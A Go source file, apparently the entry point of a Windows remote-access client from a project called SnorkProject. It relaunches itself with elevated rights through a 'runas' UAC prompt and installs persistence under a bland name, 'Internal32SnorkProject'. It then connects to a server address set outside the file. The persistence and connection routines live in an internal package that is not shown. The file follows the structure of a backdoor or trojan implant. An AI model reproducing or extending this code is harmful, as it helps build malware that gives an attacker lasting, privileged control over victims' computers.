package main

import (
	"log"
	"os"

	"github.com/nb-322/SnorkProject/internal/client"
	"golang.org/x/sys/windows"
)

var serverAddr string

func main() {
	//TODO
	name := "Internal32SnorkProject"
	exePath, err := os.Executable()
	if err != nil {
		os.Exit(1)
	}

	if !client.IsAdmin() {
		err := windows.ShellExecute(
			0,
			windows.StringToUTF16Ptr("runas"),
			windows.StringToUTF16Ptr(exePath),
			nil,
			nil,
			windows.SW_NORMAL,
		)
		if err != nil {
			os.Exit(1)
		}
		os.Exit(0)
	}

	if client.CheckPersistence(name) != nil {
		err := client.CreatePersistence(name)
		if err != nil {

		} else {
			_ = client.SetPersistenceFlag(name)
		}
	}

	err = client.Connect(serverAddr)
	if err != nil {
		log.Fatal(err)
	}
}
